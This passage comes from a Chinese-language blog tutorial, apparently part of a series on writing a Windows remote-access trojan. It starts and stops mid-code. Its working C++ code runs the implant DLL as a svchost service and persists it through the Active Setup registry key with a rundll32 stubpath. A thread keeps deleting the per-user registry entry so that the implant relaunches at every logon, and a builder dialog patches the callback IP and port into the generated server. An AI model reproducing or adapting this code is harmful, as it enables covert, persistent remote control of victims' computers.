class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">TellSCM</span><span class="params">(DWORD dwState, DWORD dwExitCode, DWORD dwProgress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SERVICE_STATUS srvStatus;</span><br><span class="line">	srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;</span><br><span class="line">	srvStatus.dwCurrentState = g_dwCurrState = dwState;</span><br><span class="line">	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;</span><br><span class="line">	srvStatus.dwWin32ExitCode = dwExitCode;</span><br><span class="line">	srvStatus.dwServiceSpecificExitCode = <span class="number">0</span>;</span><br><span class="line">	srvStatus.dwCheckPoint = dwProgress;</span><br><span class="line">	srvStatus.dwWaitHint = <span class="number">1000</span>;</span><br><span class="line">	<span class="keyword">return</span> SetServiceStatus(hServiceStatus, &amp;srvStatus);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __stdcall <span class="title">ServiceHandler</span><span class="params">(DWORD dwControl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// not really necessary because the service stops quickly</span></span><br><span class="line">	<span class="keyword">switch</span> (dwControl)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> SERVICE_CONTROL_STOP:</span><br><span class="line">		TellSCM(SERVICE_STOP_PENDING, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">		Sleep(<span class="number">10</span>);</span><br><span class="line">		TellSCM(SERVICE_STOPPED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> SERVICE_CONTROL_PAUSE:</span><br><span class="line">		TellSCM(SERVICE_PAUSE_PENDING, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">		TellSCM(SERVICE_PAUSED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> SERVICE_CONTROL_CONTINUE:</span><br><span class="line">		TellSCM(SERVICE_CONTINUE_PENDING, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">		TellSCM(SERVICE_RUNNING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> SERVICE_CONTROL_INTERROGATE:</span><br><span class="line">		TellSCM(g_dwCurrState, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">ServiceMain</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">wchar_t</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">strncpy</span>(svcname, (<span class="keyword">char</span>*)argv[<span class="number">0</span>], <span class="keyword">sizeof</span> svcname); <span class="comment">//it&#x27;s should be unicode, but if it&#x27;s ansi we do it well</span></span><br><span class="line">	wcstombs(svcname, argv[<span class="number">0</span>], <span class="keyword">sizeof</span> svcname);</span><br><span class="line">	hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);</span><br><span class="line">	<span class="keyword">if</span> (hServiceStatus == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> FreeConsole();</span><br><span class="line"></span><br><span class="line">	TellSCM(SERVICE_START_PENDING, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">	TellSCM(SERVICE_RUNNING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="comment">// call Real Service function noew</span></span><br><span class="line"></span><br><span class="line">	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);</span><br><span class="line">	HANDLE hThread = MyCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		Sleep(<span class="number">100</span>);<span class="comment">//not quit until receive stop command, otherwise the service will stop</span></span><br><span class="line">	&#125; <span class="keyword">while</span> (g_dwCurrState != SERVICE_STOP_PENDING &amp;&amp; g_dwCurrState != SERVICE_STOPPED);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (g_dwServiceType == <span class="number">0x120</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//Shared的服务 ServiceMain 不退出，不然一些系统上svchost进程也会退出</span></span><br><span class="line">		<span class="keyword">while</span> (<span class="number">1</span>) Sleep(<span class="number">10000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>记得修改端口和ip。</p>
<p>不知什么原因，现在已经无法正常启动服务，猜测和window10系统有关，不过也没什么关系。</p>
<h2 id="part14-ActiveX启动"><a href="#part14-ActiveX启动" class="headerlink" title="part14-ActiveX启动"></a>part14-ActiveX启动</h2><p>同样有缺陷，实现原理还是修改注册表，然后需要管理员权限。</p>
<h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>修改HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\，添加一个键，构造AX启动某一软件。</p>
<p>由于我们使用的是dll文件，所以需要用到rundll32.exe来调用我们dll里面的导出函数。</p>
<p>但是会出现两个问题。</p>
<ul>
<li>程序启动，系统卡住</li>
<li>重新启动两次，程序无法启动。</li>
<li>重新启动后，显示缺少dll模块，未解决。</li>
</ul>
<p>主要代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//生成键名称</span></span><br><span class="line"><span class="function">BOOL <span class="title">GetNUM</span><span class="params">(<span class="keyword">char</span>* num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CoInitialize(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	GUID guid;</span><br><span class="line">	<span class="keyword">if</span> (S_OK == ::CoCreateGuid(&amp;guid))</span><br><span class="line">	&#123;</span><br><span class="line">		_snprintf(buf, <span class="keyword">sizeof</span>(buf)</span><br><span class="line">			, <span class="string">&quot;&#123;%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X&#125;&quot;</span></span><br><span class="line">			, guid.Data1</span><br><span class="line">			, guid.Data2</span><br><span class="line">			, guid.Data3</span><br><span class="line">			, guid.Data4[<span class="number">0</span>], guid.Data4[<span class="number">1</span>]</span><br><span class="line">			, guid.Data4[<span class="number">2</span>], guid.Data4[<span class="number">3</span>], guid.Data4[<span class="number">4</span>], guid.Data4[<span class="number">5</span>]</span><br><span class="line">			, guid.Data4[<span class="number">6</span>], guid.Data4[<span class="number">7</span>]</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line">	CoUninitialize();</span><br><span class="line">	<span class="built_in">memcpy</span>(num, buf, <span class="number">64</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ActiveXSetup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HKEY hKey;</span><br><span class="line">	<span class="keyword">char</span> strFileName[MAX_PATH];           <span class="comment">//dll文件名</span></span><br><span class="line">	<span class="keyword">char</span> ActivexStr[<span class="number">1024</span>];                <span class="comment">//用于存储ActiveX的键字串</span></span><br><span class="line">	<span class="keyword">char</span> ActiveXPath[MAX_PATH];            <span class="comment">//ActiveX路径</span></span><br><span class="line">	<span class="keyword">char</span> ActiveXKey[<span class="number">64</span>];                   <span class="comment">//ActiveX 的GUID字串</span></span><br><span class="line">	<span class="keyword">char</span> strCmdLine[MAX_PATH];              <span class="comment">//存储启动的命令行参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	ZeroMemory(strFileName, MAX_PATH);</span><br><span class="line">	ZeroMemory(ActiveXPath, MAX_PATH);</span><br><span class="line">	ZeroMemory(ActivexStr, <span class="number">1024</span>);</span><br><span class="line">	ZeroMemory(ActiveXKey, <span class="number">64</span>);</span><br><span class="line">	ZeroMemory(strCmdLine, MAX_PATH);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//得到Activex路径</span></span><br><span class="line">	<span class="built_in">strcpy</span>(ActiveXPath, <span class="string">&quot;SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\&quot;</span>);</span><br><span class="line">	<span class="comment">//得到Activex的GUID</span></span><br><span class="line">	GetNUM(ActiveXKey);</span><br><span class="line">	<span class="comment">//构造dll完整文件名</span></span><br><span class="line">	GetSystemDirectory(strFileName, MAX_PATH);</span><br><span class="line">	<span class="built_in">strcat</span>(strFileName, <span class="string">&quot;\\&quot;</span>);</span><br><span class="line">	<span class="built_in">strcat</span>(strFileName, ActiveXKey);</span><br><span class="line">	<span class="built_in">strcat</span>(strFileName, <span class="string">&quot;.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//构造ActiveX的注册表键值</span></span><br><span class="line">	<span class="built_in">sprintf</span>(ActivexStr, <span class="string">&quot;%s%s&quot;</span>, ActiveXPath, ActiveXKey);</span><br><span class="line">	<span class="comment">//创建这个注册表</span></span><br><span class="line">	RegCreateKey(HKEY_LOCAL_MACHINE, ActivexStr, &amp;hKey);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//构造程序启动的命令行参数</span></span><br><span class="line">	<span class="built_in">sprintf</span>(strCmdLine, <span class="string">&quot;%s %s,FirstRun&quot;</span>, <span class="string">&quot;rundll32.exe&quot;</span>, strFileName);</span><br><span class="line">	<span class="comment">//将参数写道注册表中</span></span><br><span class="line">	RegSetValueEx(hKey, <span class="string">&quot;stubpath&quot;</span>, <span class="number">0</span>, REG_EXPAND_SZ, (BYTE*)strCmdLine, lstrlen(strCmdLine));</span><br><span class="line">	RegCloseKey(hKey);</span><br><span class="line">	<span class="comment">//释放文件</span></span><br><span class="line">	CreateEXE(strFileName, IDR_DLL, (<span class="keyword">char</span>*)<span class="string">&quot;DLL&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//启动服务端</span></span><br><span class="line">	STARTUPINFO StartInfo;</span><br><span class="line">	PROCESS_INFORMATION ProcessInformation;</span><br><span class="line">	StartInfo.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line">	StartInfo.lpDesktop = <span class="literal">NULL</span>;</span><br><span class="line">	StartInfo.lpReserved = <span class="literal">NULL</span>;</span><br><span class="line">	StartInfo.lpTitle = <span class="literal">NULL</span>;</span><br><span class="line">	StartInfo.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">	StartInfo.cbReserved2 = <span class="number">0</span>;</span><br><span class="line">	StartInfo.lpReserved2 = <span class="literal">NULL</span>;</span><br><span class="line">	StartInfo.wShowWindow = SW_SHOWNORMAL;</span><br><span class="line">	BOOL bReturn = CreateProcess(<span class="literal">NULL</span>, strCmdLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;StartInfo, &amp;ProcessInformation);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解决问题一"><a href="#解决问题一" class="headerlink" title="解决问题一"></a>解决问题一</h3><p>采用双导出函数解决，给dll添加两个导出函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">MainRun</span><span class="params">(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, <span class="keyword">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hThread = MyCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">FirstRun</span><span class="params">(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, <span class="keyword">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> strMyFileName[MAX_PATH], strCmdLine[MAX_PATH];</span><br><span class="line">	ZeroMemory(strMyFileName, MAX_PATH);</span><br><span class="line">	ZeroMemory(strCmdLine, MAX_PATH);</span><br><span class="line">	<span class="comment">//得到自身文件名</span></span><br><span class="line">	GetModuleFileName(CKeyboardManager::g_hInstance, strMyFileName, MAX_PATH);</span><br><span class="line">	<span class="comment">//构造启动参数</span></span><br><span class="line">	<span class="built_in">sprintf</span>(strCmdLine, <span class="string">&quot;%s %s,MainRun&quot;</span>, <span class="string">&quot;rundll32.exe&quot;</span>, strMyFileName);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//启动服务端</span></span><br><span class="line">	STARTUPINFO StartInfo;</span><br><span class="line">	PROCESS_INFORMATION ProcessInformation;</span><br><span class="line">	StartInfo.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line">	StartInfo.lpDesktop = <span class="literal">NULL</span>;</span><br><span class="line">	StartInfo.lpReserved = <span class="literal">NULL</span>;</span><br><span class="line">	StartInfo.lpTitle = <span class="literal">NULL</span>;</span><br><span class="line">	StartInfo.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">	StartInfo.cbReserved2 = <span class="number">0</span>;</span><br><span class="line">	StartInfo.lpReserved2 = <span class="literal">NULL</span>;</span><br><span class="line">	StartInfo.wShowWindow = SW_SHOWNORMAL;</span><br><span class="line">	BOOL bReturn = CreateProcess(<span class="literal">NULL</span>, strCmdLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;StartInfo, &amp;ProcessInformation);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解决问题二"><a href="#解决问题二" class="headerlink" title="解决问题二"></a>解决问题二</h3><p>这个问题的产生是因为，我们在添加键的同时，HKEY_CURRENT_USER\SOFTWARE\Microsoft\Active Setup\Installed Components下同样会产生一个项，导致了我们无法启动程序。</p>
<p>解决方法，创建一个线程不断删除这个项，需要解决如何找到这个项名称的问题。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">DelAXRegThread</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> strFileName[MAX_PATH];     <span class="comment">//dll文件名</span></span><br><span class="line">	<span class="keyword">char</span>* pstrTemp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">char</span> ActiveXStr[<span class="number">1024</span>];           <span class="comment">//activex 键值字符串</span></span><br><span class="line"></span><br><span class="line">	ZeroMemory(ActiveXStr, <span class="number">1024</span>);</span><br><span class="line">	ZeroMemory(strFileName, MAX_PATH);</span><br><span class="line">	<span class="comment">//得到自身文件名</span></span><br><span class="line">	GetModuleFileName(CKeyboardManager::g_hInstance, strFileName, MAX_PATH);</span><br><span class="line">	PathStripPath(strFileName); <span class="comment">//将完整文件名转换为文件名</span></span><br><span class="line">	pstrTemp = <span class="built_in">strstr</span>(strFileName, <span class="string">&quot;.dll&quot;</span>);  <span class="comment">//寻找 .dll然后将他删除掉</span></span><br><span class="line">	<span class="keyword">if</span> (pstrTemp != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		ZeroMemory(pstrTemp, <span class="built_in">strlen</span>(pstrTemp));  <span class="comment">//删除掉扩展名</span></span><br><span class="line">		<span class="comment">//构造键值</span></span><br><span class="line">		<span class="built_in">sprintf</span>(ActiveXStr, <span class="string">&quot;%s%s&quot;</span>, <span class="string">&quot;Software\\Microsoft\\Active Setup\\Installed Components\\&quot;</span>, strFileName);</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//不停的删除注册表</span></span><br><span class="line">			RegDeleteKey(HKEY_CURRENT_USER, ActiveXStr);</span><br><span class="line">			OutputDebugString(ActiveXStr);      <span class="comment">//输出删除的字串用以测试</span></span><br><span class="line">			Sleep(<span class="number">1000</span> * <span class="number">30</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后添加线程</p>
<pre><code>MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DelAXRegThread, NULL, 0, NULL);</code></pre>
<h3 id="解决问题三"><a href="#解决问题三" class="headerlink" title="解决问题三"></a>解决问题三</h3><p>估计是windows下c盘的文件保护机制，虽然我们添加了文件，但是重启后，文件就会不存在。</p>
<h2 id="part15-生成客户端"><a href="#part15-生成客户端" class="headerlink" title="part15-生成客户端"></a>part15-生成客户端</h2><p>这部分主要是为了我们修改ip时不用再去修改dll的代码，直接利用Loder.exe，遍历其内存，找到ip和端口结构体的地址，然后修改，然后重新生成一个exe。</p>
<p>怎么说比较鸡肋。</p>
<p>然后这里为了方便，我直接修改了原来的设置对话框，添加了修改ip的编辑框，然后生成server.exe的对话框就是直接从ini配置文件中获取ip和port。</p>
<p>CCreatServerDlg.cpp，添加了一个OnInitDialog对编辑框里面的内容进行初始化。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// CCreatServerDlg.cpp: 实现文件</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MyRemote.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;CCreatServerDlg.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;afxdialogex.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;IniFile.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// CCreatServerDlg 对话框</span></span><br><span class="line"></span><br><span class="line">IMPLEMENT_DYNAMIC(CCreatServerDlg, CDialogEx)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Connect_Address</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	DWORD dwstact;</span><br><span class="line">	<span class="keyword">char</span>  strIP[MAX_PATH];</span><br><span class="line">	<span class="keyword">int</span>   nPort;</span><br><span class="line">&#125;g_myAddress = &#123; <span class="number">0x1234567</span>,<span class="string">&quot;&quot;</span>,<span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">CCreatServerDlg::CCreatServerDlg(CWnd* pParent <span class="comment">/*=nullptr*/</span>)</span><br><span class="line">	: CDialogEx(IDD_CREAT_SERVER, pParent)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CCreatServerDlg::~CCreatServerDlg()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CCreatServerDlg::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CDialogEx::DoDataExchange(pDX);</span><br><span class="line">	DDX_Control(pDX, IDC_EDIT_CLIENT_IP, m_strIp);</span><br><span class="line">	DDX_Control(pDX, IDC_EDIT_CLIENT_PORT, m_strPort);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BEGIN_MESSAGE_MAP(CCreatServerDlg, CDialogEx)</span><br><span class="line">	ON_BN_CLICKED(IDOK, &amp;CCreatServerDlg::OnBnClickedOk)</span><br><span class="line">END_MESSAGE_MAP()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CCreatServerDlg 消息处理程序</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CCreatServerDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CDialogEx::OnInitDialog();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span>  在此添加额外的初始化</span></span><br><span class="line"></span><br><span class="line">	nIp = ((CMyRemoteApp*)AfxGetApp())-&gt;m_IniFile.GetString(<span class="string">&quot;Settings&quot;</span>, <span class="string">&quot;ListemIp&quot;</span>);   <span class="comment">//读取IP</span></span><br><span class="line">	nPort = ((CMyRemoteApp*)AfxGetApp())-&gt;m_IniFile.GetString(<span class="string">&quot;Settings&quot;</span>, <span class="string">&quot;ListenPort&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span>	len = m_strIp.GetWindowTextLength();</span><br><span class="line"></span><br><span class="line">	m_strIp.SetLimitText(MAXDWORD); <span class="comment">// 设置最大长度</span></span><br><span class="line">	m_strPort.SetLimitText(MAXDWORD); <span class="comment">// 设置最大长度</span></span><br><span class="line"></span><br><span class="line">	m_strIp.SetSel(<span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">	<span class="comment">//用传递过来的数据替换掉该位置的字符  </span></span><br><span class="line">	m_strIp.ReplaceSel(nIp);</span><br><span class="line"></span><br><span class="line">	m_strPort.SetSel(<span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">	<span class="comment">//用传递过来的数据替换掉该位置的字符  </span></span><br><span class="line">	m_strPort.ReplaceSel(nPort);</span><br><span class="line">	<span class="keyword">return</span> TRUE;  <span class="comment">// return TRUE unless you set the focus to a control</span></span><br><span class="line">				  <span class="comment">// 异常: OCX 属性页应返回 